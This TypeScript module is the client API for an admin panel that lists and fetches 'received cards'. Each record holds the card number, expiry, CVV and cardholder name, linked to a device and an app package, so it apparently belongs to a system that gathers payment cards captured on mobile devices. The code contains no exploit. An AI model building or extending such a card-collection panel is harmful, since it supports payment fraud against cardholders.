import http from "@/api";

/**
 * @name 信用卡管理模块
 */

// 信用卡接口返回类型
export interface ReceiveCardsItem {
  id: number;
  device_id: number | null;
  device_number: string | null;
  app_name: string | null;
  app_package: string | null;
  card_number: string | null;
  card_date: string | null;
  cvv: string | null;
  user_first_name: string | null;
  user_last_name: string | null;
  created_at: string;
  updated_at: string;
}

// 信用卡列表响应类型
export interface ReceiveCardsListResponse {
  total_num: number;
  list: ReceiveCardsItem[];
}

// 获取信用卡列表
export const getReceiveCardsListApi = (params?: {
  page?: number;
  limit?: number;
  device_number?: string;
  app_name?: string;
  app_package?: string;
  device_id?: number;
}) => {
  return http.get<ReceiveCardsListResponse>(`/admin/receiveCards/list`, params, { loading: false });
};

// 获取指定信用卡信息
export const getReceiveCardsInfoApi = (id: number) => {
  return http.get<ReceiveCardsItem>(`/admin/receiveCards/info`, { id }, { loading: false });
};

